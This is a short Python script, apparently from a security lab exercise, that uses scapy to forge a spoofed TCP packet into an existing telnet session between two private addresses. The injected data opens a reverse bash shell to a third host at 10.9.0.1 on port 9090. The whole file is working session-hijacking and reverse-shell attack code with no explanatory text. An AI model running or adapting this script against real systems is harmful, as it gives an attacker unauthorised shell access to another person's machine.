#!/usr/bin/env python3
from scapy.all import *
print("packet is bieng sent....")
ip = IP(src="10.9.0.6", dst="10.9.0.5")
tcp = TCP(sport=51968, dport=23, flags="A", seq=363580030, ack=1944603024)
data = "/bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1 \r"
pkt = ip/tcp/data
ls(pkt)
send(pkt, verbose=0)
